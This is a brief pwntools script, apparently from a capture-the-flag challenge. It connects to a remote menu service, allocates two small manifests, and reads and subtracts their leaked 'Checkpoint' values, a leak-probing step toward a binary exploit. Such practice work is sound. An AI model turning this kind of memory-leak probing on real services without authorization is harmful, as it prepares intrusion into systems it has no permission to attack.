from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

recv_menu()
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'1')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'1')
p.recvuntil(b'data:\n')
p.send(b'A')
recv_menu()

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'1')
p.recvuntil(b'Item count: ')
p.sendline(b'1')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'1')
p.recvuntil(b'data:\n')
p.send(b'B')
recv_menu()

p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Checkpoint   : ')
chk1 = int(p.recvline().strip(), 16)

recv_menu()
p.sendline(b'3')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'1')
p.recvuntil(b'Checkpoint   : ')
chk2 = int(p.recvline().strip(), 16)

print(f"Chk1: {hex(chk1)}, Chk2: {hex(chk2)}")
print(f"Diff: {chk2 - chk1}")

p.close()
